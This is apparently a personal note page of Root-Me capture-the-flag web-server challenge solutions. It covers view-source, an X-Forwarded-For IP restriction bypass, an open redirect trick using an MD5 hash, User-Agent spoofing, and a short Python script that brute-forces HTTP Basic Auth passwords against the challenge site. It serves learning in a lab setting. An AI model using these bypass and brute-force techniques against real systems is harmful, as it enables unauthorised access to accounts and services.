---
description: 'Note : A JOURNEY TO GAIN KNOWLEDGE'
---

# 🏝 Rootme

## Web - Server

### [HTML - Source code](https://www.root-me.org/en/Challenges/Web-Server/HTML-Source-code)

F12 for flag

### [HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)

``[`document`](https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c)``

![](<.gitbook/assets/image (39) (1).png>)

> **Syntax: X-Forwarded-For: \<client>,\<proxy1>,\<proxy2>,\<proxy3>**

Change IP at client to private IP by adding _**an X-Forwarded-For**_ header

![](<.gitbook/assets/image (13).png>)

### [HTTP - Open redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect)

![](<.gitbook/assets/image (35).png>)

It combines URL and hash md5 of that one, so that we just put other URL and hash of it.

![](<.gitbook/assets/image (29) (1).png>)

## HTTP - User-agent

change User-Agent to \`admin\`

![](<.gitbook/assets/image (18).png>)

## Weak password

```
import requests
from requests.auth import HTTPBasicAuth
url = "http://challenge01.root-me.org/web-serveur/ch3/"
usr = "admin"
words = open('common_password.txt','r').read().split('\n')
cnt =1
for pwd in words:
	print(pwd,cnt)
	
	res = requests.get(url, auth=HTTPBasicAuth(usr, pwd))
	
	if "401" not in res.text:
		print('Password is ' + pwd)
		break
	cnt +=1
```

![](<.gitbook/assets/image (39).png>)

## PHP - Command injection

![](<.gitbook/assets/image (32).png>)

![](<.gitbook/assets/image (33).png>)



``[`document`](https://portswigger.net/web-security/os-command-injection)``

##
